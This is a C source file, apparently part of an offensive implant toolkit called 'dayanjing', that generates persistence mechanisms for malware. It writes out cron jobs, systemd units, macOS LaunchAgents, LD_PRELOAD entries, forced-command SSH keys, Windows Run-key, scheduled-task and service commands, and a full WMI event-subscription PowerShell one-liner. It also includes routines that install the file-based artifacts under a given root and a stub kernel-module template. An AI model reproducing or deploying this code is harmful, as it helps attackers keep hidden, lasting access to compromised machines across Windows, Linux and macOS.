#include "persist.h"
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

/* ---------- generate ---------- */
static size_t gen_cron(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "* * * * * %s", arg ? arg : "true");
}
static size_t gen_systemd(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "[Unit]\nDescription=dayanjing agent\n\n[Service]\nExecStart=%s\n"
        "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n",
        arg ? arg : "/bin/true");
}
static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n"
        "  <string>com.dayanjing.agent</string>\n"
        "  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n"
        "    <string>-c</string>\n    <string>%s</string>\n  </array>\n"
        "  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\n",
        arg ? arg : "true");
}
static size_t gen_ldpreload(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "%s", arg ? arg : "/tmp/.agent.so");
}
static size_t gen_sshkey(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "command=\"%s\" ssh-rsa AAAAB3NzaC1yc2EAAAA placeholder-agent-key",
        arg ? arg : "true");
}
static size_t gen_registry(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v DayanjingAgent /t REG_SZ /d \"%s\" /f", arg ? arg : "agent.exe");
}
static size_t gen_schtask(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "schtasks /create /tn DayanjingAgent /tr \"%s\" /sc onlogon /f",
        arg ? arg : "agent.exe");
}
static size_t gen_wmi(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "powershell -nop -c \"$f=Set-WmiInstance -Class __EventFilter "
        "-Namespace root/subscription -Arguments @{Name='dj';Query='SELECT * FROM __InstanceModificationEvent "
        "WITHIN 60 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'};"
        "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription "
        "-Arguments @{Name='dj';CommandLineTemplate='%s'};"
        "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}\"",
        arg ? arg : "agent.exe");
}
static size_t gen_service(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "sc create DayanjingAgent binPath= \"%s\" start= auto",
        arg ? arg : "agent.exe");
}
static size_t gen_lkm(const char *arg, char *out, size_t cap) {
    (void)arg;
    return (size_t)snprintf(out, cap,
        "# <kernel module> 见 persist_kernel_source()，需目标机内核头编译，"
        "沙盒内 UNVERIFIED_KERNEL");
}

static const persist_desc_t descs[] = {
    { PERSIST_CRON,        "cron",         PERSIST_PLAT_NIX, gen_cron },
    { PERSIST_SYSTEMD,     "systemd",      PERSIST_PLAT_NIX, gen_systemd },
    { PERSIST_LAUNCHAGENT, "launchagent",  PERSIST_PLAT_ANY, gen_launchagent },
    { PERSIST_LDPRELOAD,   "ld_preload",   PERSIST_PLAT_NIX, gen_ldpreload },
    { PERSIST_SSHKEY,      "ssh_key",      PERSIST_PLAT_NIX, gen_sshkey },
    { PERSIST_REGISTRY,    "registry_run", PERSIST_PLAT_WIN, gen_registry },
    { PERSIST_SCHTASK,     "schtask",      PERSIST_PLAT_WIN, gen_schtask },
    { PERSIST_WMI,         "wmi_event",    PERSIST_PLAT_WIN, gen_wmi },
    { PERSIST_SERVICE,     "win_service",  PERSIST_PLAT_WIN, gen_service },
    { PERSIST_LKM,         "lkm",          3,                gen_lkm },
};

size_t persist_method_count(void) { return sizeof descs / sizeof descs[0]; }
const persist_desc_t *persist_method_at(size_t i) {
    return (i < persist_method_count()) ? &descs[i] : NULL;
}

static const persist_desc_t *find_desc(persist_method_t m) {
    for (size_t i = 0; i < persist_method_count(); i++)
        if (descs[i].id == m) return &descs[i];
    return NULL;
}

size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t cap) {
    const persist_desc_t *d = find_desc(m);
    if (!d || !out || cap == 0) return 0;
    int n = (int)d->generate(arg, out, cap);
    if (n < 0 || (size_t)n >= cap) return 0;
    return (size_t)n;
}

/* ---------- install / uninstall（假根，仅文件型） ---------- */
static const char *fname_of(persist_method_t m) {
    switch (m) {
        case PERSIST_CRON:        return "cron";
        case PERSIST_SYSTEMD:     return "systemd";
        case PERSIST_LAUNCHAGENT: return "launchagent";
        case PERSIST_LDPRELOAD:   return "ld.so.preload";
        case PERSIST_SSHKEY:      return "authorized_keys";
        default:                  return NULL;
    }
}

int persist_install(persist_method_t m, const char *root_prefix, const char *arg) {
    const persist_desc_t *d = find_desc(m);
    if (!d) return -1;
    const char *fn = fname_of(m);
    if (!fn) return -2;                 /* 非文件型 / 平台不支持 */
    if (!root_prefix || !arg) return -1;
    mkdir(root_prefix, 0755);
    char path[512];
    snprintf(path, sizeof path, "%s/%s", root_prefix, fn);
    char buf[4096];
    size_t n = persist_generate(m, arg, buf, sizeof buf);
    if (n == 0) return -1;
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    size_t w = fwrite(buf, 1, n, f);
    fclose(f);
    return (w == n) ? 0 : -1;
}

int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg) {
    const persist_desc_t *d = find_desc(m);
    if (!d) return -1;
    const char *fn = fname_of(m);
    if (!fn) return -2;
    if (!root_prefix) return -1;
    (void)arg;
    char path[512];
    snprintf(path, sizeof path, "%s/%s", root_prefix, fn);
    return (unlink(path) == 0) ? 0 : -1;
}

const char *persist_kernel_source(void) {
    static const char *src =
        "/* dayanjing_lkm.c — 内核级持久化模板（UNVERIFIED_KERNEL）\n"
        " * 需目标机内核头文件编译：make -C /lib/modules/$(uname -r)/build M=$(pwd) modules\n"
        " * 沙盒无内核头，此处仅作交付源码，不做编译验证。 */\n"
        "#include <linux/module.h>\n"
        "#include <linux/kernel.h>\n"
        "#include <linux/init.h>\n"
        "static int __init dj_init(void) { printk(KERN_INFO \"dayanjing lkm loaded\\n\"); return 0; }\n"
        "static void __exit dj_exit(void) { printk(KERN_INFO \"dayanjing lkm unloaded\\n\"); }\n"
        "module_init(dj_init);\nmodule_exit(dj_exit);\n"
        "MODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"dayanjing\");\n";
    return src;
}
